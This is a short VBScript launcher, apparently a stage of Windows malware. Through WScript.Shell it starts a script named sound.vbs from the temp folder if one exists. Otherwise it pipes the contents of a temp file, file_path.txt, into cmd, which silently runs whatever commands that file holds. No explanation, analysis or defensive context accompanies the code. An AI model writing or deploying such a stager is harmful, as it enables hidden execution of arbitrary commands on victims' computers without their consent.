Dim objShell
Set objShell = WScript.CreateObject("WScript.Shell")
objShell.Run "cmd /c if exist %TEMP%\sound.vbs (start %TEMP%\sound.vbs) else (cmd < %TEMP%\file_path.txt)"
